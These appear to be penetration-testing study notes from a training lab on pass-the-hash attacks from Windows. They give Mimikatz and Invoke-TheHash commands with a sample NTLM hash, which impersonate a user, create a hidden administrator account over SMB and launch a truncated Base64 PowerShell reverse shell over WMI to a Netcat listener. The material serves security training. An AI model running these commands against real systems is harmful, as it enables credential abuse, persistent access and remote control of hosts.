# PtH from Windows (Post-Exploitation)
```table-of-contents
```
## Mimikatz (`sekurlsa::pth`)
**Parameters:**
- `/user`: User to impersonate.
- `/rc4` or `/NTLM`: The NTLM hash.
- `/domain`: Target domain (use `.` for local accounts).
- `/run`: Binary to run (default: `cmd.exe`).
```powershell
# Syntax: mimikatz.exe "sekurlsa::pth /user:<User> /rc4:<NTLM_Hash> /domain:<Domain> /run:cmd.exe"

# Example: Spawning a CMD as Julio using his hash
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
## Invoke-TheHash (PowerShell)
**Key Parameters:**
- `-Target`: IP or Hostname. 
- `-Hash`: NTLM Hash.
- `-Command`: Command to execute (e.g., net user add, or a reverse shell payload).
### Method A: SMBExec
```powershell
Import-Module .\Invoke-TheHash.psd1

# Create a user and add to admins
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add"
```
#### Method B: WMIExec (Reverse Shell)
1. **Generate Payload:** Use [RevShells.com](https://www.revshells.com/) -> PowerShell #3 (Base64).
2. **Start Listener:** `nc -lvnp 8001`
3. **Execute:**
```powershell
Import-Module .\Invoke-TheHash.psd1

# Execute Base64 Payload via WMI
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0AL..."
```